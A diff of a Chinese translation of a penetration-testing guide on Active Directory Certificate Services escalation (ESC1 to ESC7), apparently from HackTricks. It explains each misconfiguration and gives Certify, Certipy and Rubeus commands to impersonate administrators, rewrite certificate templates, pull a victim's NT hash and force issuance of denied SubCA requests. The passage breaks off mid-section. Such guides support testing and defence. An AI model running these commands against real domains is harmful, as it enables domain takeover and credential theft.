@@ -3,42 +3,42 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-**这是以下文章中关于提升技术部分的摘要：**
+**以下是相关文章中 escalation technique 部分的摘要：**
 
 - [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 - [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
 - [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
 
-## Misconfigured Certificate Templates - ESC1
+## 配置错误的 Certificate Templates - ESC1
 
-### Explanation
+### 说明
 
-### Misconfigured Certificate Templates - ESC1 Explained
+### 配置错误的 Certificate Templates - ESC1 详解
 
-- **注册权限被 Enterprise CA 授予给低权限用户。**
-- **不需要经理批准。**
+- **Enterprise CA 向低权限用户授予了 Enrolment 权限。**
+- **不需要 Manager approval。**
 - **不需要授权人员的签名。**
-- **证书模板上的安全描述符过于宽松，允许低权限用户获得注册权限。**
-- **证书模板被配置为定义便于身份验证的 EKU：**
-- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
-- **模板允许请求者在 Certificate Signing Request (CSR) 中包含 subjectAltName：**
-- Active Directory (AD) 在证书中存在 subjectAltName (SAN) 时，会优先使用 SAN 来进行身份验证。这意味着通过在 CSR 中指定 SAN，可以请求伪装为任何用户（例如域管理员）的证书。是否允许请求者指定 SAN 由证书模板在 AD 中的对象通过 `mspki-certificate-name-flag` 属性指示。该属性是一个位掩码，存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志时，允许请求者指定 SAN。
+- **Certificate Templates 上的 Security descriptors 过于宽松，允许低权限用户获得 Enrolment 权限。**
+- **Certificate Templates 被配置为定义有助于 authentication 的 EKU：**
+- 包含 Extended Key Usage (EKU) 标识符，例如 Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0) 或没有 EKU (SubCA)。
+- **Template 允许 requesters 在 Certificate Signing Request (CSR) 中加入 subjectAltName：**
+- 如果证书中存在 subjectAltName (SAN)，Active Directory (AD) 会在身份验证时优先使用它。这意味着通过在 CSR 中指定 SAN，可以请求证书来 impersonate 任意用户（例如 domain administrator）。requester 是否可以指定 SAN，由 Certificate Template 的 AD object 中的 `mspki-certificate-name-flag` property 指示。此 property 是一个 bitmask，如果存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag，则允许 requester 指定 SAN。
 
 > [!CAUTION]
-> 上述配置允许低权限用户请求带任意 SAN 的证书，从而能够通过 Kerberos 或 SChannel 以任何域主体进行身份验证。
+> 上述配置允许低权限用户请求包含任意 SAN 的证书，从而通过 Kerberos 或 SChannel 以任意 domain principal 的身份进行 authentication。
 
-此功能有时被启用以支持产品或部署服务即时生成 HTTPS 或主机证书，或因缺乏理解而被误用。
+此功能有时用于支持产品或 deployment services 动态生成 HTTPS 或 host certificates，也可能是由于缺乏理解而启用。
 
-需要注意的是，使用此选项创建证书会触发警告；但如果复制现有的证书模板（例如启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板）然后修改以包含身份验证 OID，则不会出现该警告。
+需要注意的是，使用此选项创建证书会触发 warning；但复制现有的 Certificate Template（例如已启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` template），然后修改它以加入 authentication OID 时，则不会触发该 warning。
 
-### Abuse
+### 利用
 
-要 **查找易受攻击的证书模板**，你可以运行：
+要**查找存在漏洞的 Certificate Templates**，可以运行：
 ```bash
 Certify.exe find /vulnerable
 certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 ```
-要 **滥用此漏洞以冒充管理员**，可以运行：
+要**利用此漏洞冒充管理员**，可以运行：
 ```bash
 # Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
 Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local
@@ -54,68 +54,68 @@ Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:ad
 certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
 -template 'ESC1' -upn 'administrator@corp.local'
 ```
-然后你可以将生成的 **证书转换为 `.pfx`** 格式，并再次使用它通过 **Rubeus 或 certipy 进行身份验证**：
+然后，你可以将生成的 **证书转换为 `.pfx`** 格式，再次使用 Rubeus 或 certipy **进行身份验证**：
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
-Windows 二进制文件 "Certreq.exe" 和 "Certutil.exe" 可用于生成 PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
+Windows 二进制文件“Certreq.exe”和“Certutil.exe”可用于生成 PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-可以通过运行以下 LDAP 查询来枚举 AD 林的配置架构中的证书模板，尤其是那些不需要批准或签名、具有 Client Authentication 或 Smart Card Logon EKU 且启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的模板：
+可以通过运行以下 LDAP query，对 AD Forest 配置架构中的证书模板进行 enumeration，具体筛选不需要批准或签名、具有 Client Authentication 或 Smart Card Logon EKU，并启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag 的模板：
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
 ## 配置错误的证书模板 - ESC2
 
-### 解释
+### 说明
 
-第二种滥用情形是第一种的变体：
+第二种滥用场景是第一种场景的变体：
 
-1. Enterprise CA 向低权限用户授予注册权限。
-2. 对经理批准的要求被禁用。
-3. 授权签名的要求被省略。
-4. 证书模板上的安全描述符过于宽松，授予低权限用户证书注册权限。
-5. **证书模板被定义为包含 Any Purpose EKU 或无 EKU。**
+1. Enterprise CA 向低权限用户授予了 Enrollment 权限。
+2. 禁用了管理员批准要求。
+3. 省略了授权签名要求。
+4. 证书模板上过于宽松的 security descriptor 向低权限用户授予了证书 Enrollment 权限。
+5. **证书模板被定义为包含 Any Purpose EKU，或不包含 EKU。**
 
-Any Purpose EKU 允许攻击者为任何用途获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以使用与 ESC3 相同的技术来利用这种情形。
+**Any Purpose EKU** 允许攻击者出于**任何目的**获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以采用与 **ESC3** 相同的 **technique** 来利用此场景。
 
-没有 EKU 的证书（作为下级 CA 证书）可以被用于任何目的，也可以用来签发新的证书。因此，攻击者可以利用下级 CA 证书在新证书中指定任意 EKU 或字段。
+不包含 **EKU** 的证书会作为 subordinate CA 证书运行，因此可以被用于**任何目的**，并且**还可以用于签发新证书**。因此，攻击者可以利用 subordinate CA 证书，在新证书中指定任意 EKU 或字段。
 
-然而，如果下级 CA 未被 `NTAuthCertificates` 对象信任（这是默认设置），则为域身份验证创建的新证书将无法生效。尽管如此，攻击者仍然可以创建具有任意 EKU 和任意证书值的新证书。这些证书可能被滥用来实现广泛的目的（例如代码签名、服务器身份验证等），并可能对网络中其他应用（如 SAML、AD FS 或 IPSec）产生重大影响。
+但是，如果 subordinate CA 未被 **`NTAuthCertificates`** 对象信任（默认设置），则为**域身份验证**创建的新证书将无法正常工作。尽管如此，攻击者仍然可以创建具有任意 EKU 和任意证书值的**新证书**。这些证书可能被**滥用**于各种用途（例如代码签名、服务器身份验证等），并可能对网络中的其他应用产生重大影响，例如 SAML、AD FS 或 IPSec。
 
-要在 AD Forest 的配置架构中枚举符合此情形的模板，可运行以下 LDAP 查询：
+要在 AD Forest 的配置架构中枚举符合此场景的模板，可以运行以下 LDAP 查询：
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
 ```
-## 配置错误的 Enrolment Agent 模板 - ESC3
+## 配置错误的 Enrollment Agent 模板 - ESC3
 
-### 解释
+### 说明
 
-这种情形类似第一个和第二个，但**滥用**了一个**不同的 EKU**（Certificate Request Agent）和**两个不同的模板**（因此有两套要求），
+此场景与第一个和第二个场景类似，但**滥用**了一个**不同的 EKU**（Certificate Request Agent）以及 **2 个不同的模板**（因此有 2 组要求）。
 
-**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1)，在 Microsoft 文档中称为 **Enrollment Agent**，允许主体**为另一个用户注册**该**证书**。
+**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）在 Microsoft 文档中称为 **Enrollment Agent**，允许主体**代表其他用户申请** **certificate**。
 
-该**“enrollment agent”** 在此类**模板**上进行注册，并使用得到的**证书替其他用户对 CSR 进行共签**。然后它将**共签的 CSR 发送**给 CA，注册一个**允许 “enroll on behalf of”** 的**模板**，CA 随后返回一个**属于 “其他” 用户的证书**。
+**“enrollment agent”** 会在此类**模板**中进行申请，并使用生成的 **certificate** **代表其他用户为 CSR 联署**。随后，它会将**联署后的 CSR**发送到 CA，申请一个**允许“代表他人申请”**的**模板**，CA 则会返回一个**属于“其他”用户的 certificate**。
 
 **要求 1：**
 
-- Enterprise CA 向低权限用户授予了 enrollment 权限。
-- 省略了经理批准的要求。
-- 无需授权签名的要求。
-- 证书模板的安全描述符过于宽松，向低权限用户授予了 enrollment 权限。
-- 证书模板包含 Certificate Request Agent EKU，使其能够代表其他主体请求其他证书模板。
+- Enterprise CA 向低权限用户授予申请权限。
+- 未要求经理审批。
+- 不要求授权签名。
+- certificate 模板的安全描述符权限过于宽松，向低权限用户授予了申请权限。
+- certificate 模板包含 Certificate Request Agent EKU，从而能够代表其他主体申请其他 certificate 模板。
 
 **要求 2：**
 
-- Enterprise CA 向低权限用户授予了 enrollment 权限。
-- 绕过了经理批准。
-- 模板的 schema 版本为 1 或大于 2，并且它指定了一个需要 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
-- 证书模板中定义的某个 EKU 允许域认证。
-- CA 未对 enrollment agent 应用限制。
+- Enterprise CA 向低权限用户授予申请权限。
+- 绕过经理审批。
+- 模板的架构版本为 1 或高于 2，并指定了一个要求 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
+- certificate 模板中定义的某个 EKU 允许域身份验证。
+- CA 未应用 Enrollment Agent 限制。
 
-### 滥用
+### 利用
 
-你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来滥用此情形：
+你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来利用此场景：
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
@@ -129,44 +129,44 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
-允许**获取****enrollment agent certificate**的**用户**、允许enrollment **agents**注册的模板，以及enrollment agent可以代表其操作的**帐户**，都可以由企业CA加以限制。可通过打开`certsrc.msc` **snap-in**，**在 CA 上右键单击**，**单击 Properties**，然后**导航**到 “Enrollment Agents” 选项卡实现。
+允许 **获取** **enrollment agent certificate** 的 **users**、允许 **agents** 进行 enrollment 的模板，以及 enrollment agent 可代表其执行操作的 **accounts**，都可以由 enterprise CA 进行限制。具体操作是打开 `certsrc.msc` **snap-in**，**右键单击 CA**，**点击 Properties**，然后**导航**到“Enrollment Agents”选项卡。
 
-但是，值得注意的是 CA 的**默认**设置是“**Do not restrict enrollment agents**”。当管理员启用对 enrollment agents 的限制并将其设置为“Restrict enrollment agents”时，默认配置仍然非常宽松。它允许**Everyone**以任何身份在所有模板中进行注册。
+不过需要注意，CA 的**默认**设置是“**Do not restrict enrollment agents**”。当管理员启用 enrollment agents 限制，并将其设置为“Restrict enrollment agents”时，默认配置仍然极其宽松。它允许 **Everyone** 以任何人的身份在所有模板中进行 enrollment。
 
-## 易受攻击的证书模板访问控制 - ESC4
+## Vulnerable Certificate Template Access Control - ESC4
 
-### **说明**
+### **Explanation**
 
-**证书模板**上的**安全描述符**定义了特定**AD 主体**对该模板所拥有的**权限**。
+**certificate templates** 上的 **security descriptor** 定义了特定 **AD principals** 针对模板所拥有的**权限**。
 
-如果**攻击者**拥有必要的**权限**去**更改**某个**模板**并施加在**先前章节**中列出的任何**可利用的错误配置**，则可能促成权限提升。
+如果 **attacker** 拥有**修改** **template** 所需的**权限**，并能够**实施** **prior sections** 中所述的任何**可利用的错误配置**，则可能实现 privilege escalation。
 
-值得注意的适用于证书模板的权限包括：
+适用于 certificate templates 的重要权限包括：
 
-- **Owner:** 隐式地授予对对象的控制，允许修改任何属性。
-- **FullControl:** 赋予对对象的完全控制权，包括更改任何属性的能力。
-- **WriteOwner:** 允许将对象的所有者更改为攻击者可控制的主体。
-- **WriteDacl:** 允许调整访问控制，可能将 FullControl 授予攻击者。
-- **WriteProperty:** 授权编辑对象的任意属性。
+- **Owner:** 授予对对象的隐式控制权，允许修改任何属性。
+- **FullControl:** 授予对对象的完全控制权，包括修改任何属性的能力。
+- **WriteOwner:** 允许将对象的所有者修改为由 attacker 控制的 principal。
+- **WriteDacl:** 允许调整访问控制，从而可能授予 attacker FullControl。
+- **WriteProperty:** 允许编辑任意对象属性。
 
-### 滥用
+### Abuse
 
-要识别在模板和其他 PKI 对象上具有编辑权限的主体，请使用 Certify 枚举：
+要识别对模板和其他 PKI 对象拥有编辑权限的 principals，请使用 Certify 进行枚举：
 ```bash
 Certify.exe find /showAllPermissions
 Certify.exe pkiobjects /domain:corp.local /showAdmins
 ```
-下面是一个与之前类似的 privesc 示例：
+一个类似于前一个示例的 privesc：
 
 <figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
 
-ESC4 是指用户对证书模板具有写入权限。比如，可以滥用该权限覆盖证书模板的配置，从而使该模板对 ESC1 易受攻击。
+ESC4 是指用户对证书模板拥有写入权限。例如，可以利用此权限覆盖证书模板的配置，使该模板容易受到 ESC1 攻击。
 
-如上路径所示，只有 `JOHNPC` 拥有这些权限，但我们的用户 `JOHN` 对 `JOHNPC` 有新的 `AddKeyCredentialLink` 边。由于该技术与证书相关，我也实现了该攻击，该攻击被称为 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。下面是 Certipy’s `shadow auto` command 用于检索受害者 NT hash 的一个小预览。
+正如上方路径所示，只有 `JOHNPC` 拥有这些权限，但我们的用户 `JOHN` 对 `JOHNPC` 新增了 `AddKeyCredentialLink` 边。由于此技术与证书相关，我也实现了这种攻击，该攻击称为 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。下面简要展示 Certipy 的 `shadow auto` 命令如何获取受害者的 NT hash。
 ```bash
 certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
 ```
-**Certipy** 可以用单个命令覆盖证书模板的配置。**默认**情况下，**Certipy** 会**覆盖**配置以使其**易受 ESC1 攻击**。我们也可以指定 **`-save-old` 参数来保存旧的配置**，这在我们攻击后**恢复**配置时会很有用。
+**Certipy** 可以通过单条命令覆盖证书模板的配置。**默认情况下**，Certipy 会**覆盖**配置，使其**容易受到 ESC1 攻击**。我们还可以指定 **`-save-old` 参数以保存旧配置**，这在攻击后**恢复**配置时会很有用。
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -177,37 +177,37 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
-## 易受攻击的 PKI 对象访问控制 - ESC5
+## Vulnerable PKI Object Access Control - ESC5
 
-### 说明
+### Explanation
 
-基于 ACL 的相互关联关系形成了一个广泛的网络，除了 certificate templates 和 certificate authority 之外，还包括若干对象，这些对象可能影响整个 AD CS 系统的安全。可能显著影响安全的对象包括：
+由 ACL 构成的复杂互联关系网络不仅涉及证书模板和证书颁发机构，还包括多个其他对象，这些关系可能影响整个 AD CS 系统的安全性。这些可能对安全性产生重大影响的对象包括：
 
-- CA 服务器的 AD 计算机对象，可能通过 S4U2Self 或 S4U2Proxy 等机制被妥协。
-- CA 服务器的 RPC/DCOM 服务。
-- 位于容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 下的任何后代 AD 对象或容器。该路径包括但不限于 Certificate Templates container、Certification Authorities container、NTAuthCertificates 对象以及 Enrollment Services Container 等容器和对象。
+- CA server 的 AD computer object，可能通过 S4U2Self 或 S4U2Proxy 等机制遭到 compromise。
+- CA server 的 RPC/DCOM server。
+- 特定容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 中的任何后代 AD object 或 container。该路径包括但不限于 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 和 Enrollment Services Container 等 container 和 object。
 
-如果低权限攻击者设法控制了这些关键组件中的任何一个，PKI 系统的安全就可能被破坏。
+如果低权限 attacker 成功控制其中任何一个关键组件，PKI 系统的安全性就可能遭到破坏。
 
 ## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
-### 说明
+### Explanation
 
-在 [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也涉及 Microsoft 所述的 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志的影响。当该配置在 Certification Authority (CA) 上启用时，允许在任何请求的 **subject alternative name** 中包含 **user-defined values**，包括那些从 Active Directory® 构造的请求。因此，这使得入侵者能够通过任何为域 **authentication** 配置且允许 **unprivileged** 用户注册的模板（例如标准的 User template）进行注册。结果，攻击者可以获取证书，从而以域管理员或域内的任何其他活动实体进行身份验证。
+[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也涉及 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag 的影响，Microsoft 对此也进行了说明。当该配置在 Certification Authority（CA）上启用时，允许在 **subject alternative name** 中加入 **user-defined values**，适用于**任何 request**，包括从 Active Directory® 构造的 request。因此，intruder 可以通过**任何 template** 进行 enrollment，只要该 template 配置为支持 domain **authentication**，尤其是那些允许 **unprivileged** user enrollment 的 template，例如标准 User template。这样，intruder 就能获取 certificate，并以 domain administrator 或 domain 中的**任何其他活动实体**身份进行 authentication。
 
-注意：通过在 `certreq.exe` 中使用 `-attrib "SAN:"` 参数（称为 “Name Value Pairs”）将 alternative names 附加到 Certificate Signing Request (CSR) 的方法，与在 ESC1 中利用 SAN 的策略存在差异。这里的区别在于帐户信息的封装方式——它被包含在证书属性（certificate attribute）中，而不是扩展（extension）中。
+**Note**：通过 `certreq.exe` 中的 `-attrib "SAN:"` argument（称为“Name Value Pairs”）向 Certificate Signing Request（CSR）添加 **alternative names** 的方式，与 ESC1 中利用 SAN 的 exploitation strategy **不同**。这里的区别在于 **account information 的封装方式**——它位于 certificate attribute 中，而不是 extension 中。
 
-### 滥用
+### Abuse
 
-要验证该设置是否已启用，组织可以使用带有 `certutil.exe` 的以下命令：
+组织可以使用以下 `certutil.exe` command 验证该 setting 是否已启用：
 ```bash
 certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 ```
-该操作本质上利用了 **remote registry access**，因此一种可替代的方法可能是：
+此操作本质上使用了 **远程注册表访问**，因此，另一种方法可能是：
 ```bash
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
 ```
-像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测到此误配置并加以利用：
+像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测并利用此配置错误：
 ```bash
 # Detect vulnerabilities, including this one
 Certify.exe find
@@ -216,39 +216,39 @@ Certify.exe find
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 ```
-要更改这些设置，假设拥有 **域管理员** 权限或同等权限，可以在任何工作站上执行以下命令：
+要修改这些设置，假设拥有 **domain administrative** 权限或等效权限，可以从任意工作站执行以下命令：
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
-要在您的环境中禁用此配置，可以移除该 flag：
+要在你的环境中禁用此配置，可以使用以下命令移除该标志：
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
 > [!WARNING]
-> 自 2022 年 5 月安全更新之后，新签发的 **证书** 将包含一个 **安全扩展**，该扩展包含 **请求者的 `objectSid` 属性**。对于 ESC1，该 SID 来源于指定的 SAN。然而，对于 **ESC6**，SID 反映的是 **请求者的 `objectSid`**，而不是 SAN。\
-> 要利用 ESC6，系统必须易受 ESC10 (Weak Certificate Mappings) 的影响，后者会优先考虑 **SAN 而不是新的安全扩展**。
+> 在 2022 年 5 月安全更新之后，新签发的 **certificates** 将包含一个 **security extension**，其中包含 **requester 的 `objectSid` 属性**。对于 ESC1，此 SID 来源于指定的 SAN。但是，对于 **ESC6**，该 SID 与 **requester 的 `objectSid`** 一致，而不是来自 SAN。\
+> 要利用 ESC6，系统必须易受 ESC10（Weak Certificate Mappings）影响，因为 ESC10 会优先使用 **SAN，而不是新的 security extension**。
 
-## 易受攻击的证书颁发机构访问控制 - ESC7
+## Vulnerable Certificate Authority Access Control - ESC7
 
-### 攻击 1
+### Attack 1
 
-#### 说明
+#### Explanation
 
-证书颁发机构的访问控制通过一组权限来维护，这些权限决定 CA 的操作。这些权限可以通过访问 `certsrv.msc`、对 CA 右键单击、选择 属性，然后切换到 安全 选项卡 来查看。此外，也可以使用 PSPKI 模块通过诸如以下的命令枚举这些权限：
+证书颁发机构的访问控制通过一组用于管理 CA 操作的权限来维护。可以通过访问 `certsrv.msc`，右键单击 CA，选择属性，然后进入 Security 选项卡来查看这些权限。此外，还可以使用 PSPKI module，通过以下命令枚举权限：
 ```bash
 Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
 ```
-This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA 管理员” and “证书管理员” respectively.
+这提供了对主要权限的见解，即 **`ManageCA`** 和 **`ManageCertificates`**，分别对应“CA administrator”和“Certificate Manager”角色。
 
-#### 滥用
+#### Abuse
 
-在证书颁发机构上拥有 **`ManageCA`** 权限允许主体使用 PSPKI 远程操作设置。这包括切换 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志以允许在任意模板中指定 SAN，这是进行 domain escalation 的关键环节。
+在证书颁发机构上拥有 **`ManageCA`** 权限后，principal 可以使用 PSPKI 远程操纵设置。其中包括启用 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志，以允许在任何 template 中指定 SAN，这是 domain escalation 的关键环节。
 
-可以使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet 来简化此过程，从而在不直接使用 GUI 的情况下进行修改。
+通过使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet，可以简化此过程，无需直接与 GUI 交互即可完成修改。
 
-拥有 **`ManageCertificates`** 权限可以批准待处理请求，从而有效规避“CA 证书管理员审批”这一防护。
+拥有 **`ManageCertificates`** 权限可以批准待处理的 requests，从而有效绕过“CA certificate manager approval”保护措施。
 
-可以结合 **Certify** 和 **PSPKI** 模块来请求、批准并下载证书：
+可以结合使用 **Certify** 和 **PSPKI** modules 来请求、批准并下载 certificate：
 ```bash
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
@@ -264,33 +264,33 @@ Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -R
 # Download the certificate
 Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 ```
-### 攻击 2
+### Attack 2
 
 #### 说明
 
 > [!WARNING]
-> 在**前一次攻击**中，使用了 **`Manage CA`** 权限去**启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志以执行 **ESC6 攻击**，但在 CA 服务（`CertSvc`）重新启动之前，这不会产生任何效果。当用户拥有 `Manage CA` 访问权限时，该用户也被允许**重启该服务**。然而，这**并不意味着该用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，**ESC6 可能在大多数已打补丁的环境中无法开箱即用**。
+> 在**上一个攻击**中，使用了 **`Manage CA`** 权限来**启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志，以执行 **ESC6 attack**，但在重启 CA 服务（`CertSvc`）之前不会生效。当用户拥有 **`Manage CA`** 访问权限时，该用户也被允许**重启服务**。但是，这**并不意味着该用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，在大多数已修补的环境中，E**SC6 可能无法开箱即用**。
 
 因此，这里介绍另一种攻击。
 
 前提条件：
 
-- 仅 **`ManageCA` 权限**
-- **`Manage Certificates`** 权限（可由 **`ManageCA`** 授予）
-- 证书模板 **`SubCA`** 必须**启用**（可由 **`ManageCA`** 启用）
+- 仅需 **`ManageCA` permission**
+- **`Manage Certificates`** permission（可通过 **`ManageCA`** 授予）
+- Certificate template **`SubCA`** 必须处于**启用**状态（可通过 **`ManageCA`** 启用）
 
-该技术基于这样的事实：具有 `Manage CA` _和_ `Manage Certificates` 访问权限的用户可以**提交失败的证书请求**。证书模板 **`SubCA`** **易受 ESC1 影响**，但**只有管理员**可以在该模板上进行注册。因此，**用户**可以**请求**在 **`SubCA`** 上注册——该请求会被**拒绝**——但随后会由**管理员****签发**。
+该技术利用了这样一个事实：拥有 `Manage CA` 和 `Manage Certificates` access right 的用户可以**签发失败的证书请求**。**`SubCA`** certificate template **vulnerable to ESC1**，但只有**管理员**可以在该模板中进行注册。因此，**用户**可以请求在 **`SubCA`** 中注册——该请求会被**拒绝**——但随后会由管理员签发。
 
-#### 滥用
+#### Abuse
 
-你可以通过将你的用户添加为新的 officer 来**授予自己 `Manage Certificates`** 访问权限。
+你可以通过将自己的用户添加为新的审核员，**授予自己 `Manage Certificates`** access right。
 ```bash
 certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully added officer 'John' on 'corp-DC-CA'
 ```
-**`SubCA`** 模板可以使用 `-enable-template` 参数**在 CA 上启用**。默认情况下，`SubCA` 模板是启用的。
+**`SubCA`** 模板可以通过 `-enable-template` 参数在 CA 上**启用**。默认情况下，`SubCA` 模板已启用。
 ```bash
 # List templates
 certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
@@ -302,9 +302,9 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
-如果我们已满足此攻击的先决条件，我们可以开始通过 **请求基于 `SubCA` 模板的证书**。
+如果我们已满足此 attack 的前提条件，就可以从**基于 `SubCA` template 请求证书**开始。
 
-**该请求将被拒绝**d, 但我们会保存 private key 并记录 request ID。
+**此请求将被拒绝**，但我们会保存 private key 并记下 request ID。
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -316,14 +316,14 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-借助我们的 **`Manage CA` 和 `Manage Certificates`**，我们可以使用 `ca` 命令及 `-issue-request <request ID>` 参数来 **签发失败的证书** 请求。
+通过 **`Manage CA` 和 `Manage Certificates`**，我们可以使用 `ca` 命令及 `-issue-request <request ID>` 参数，**签发失败的证书**请求。
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
-最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数**检索已签发的证书**。
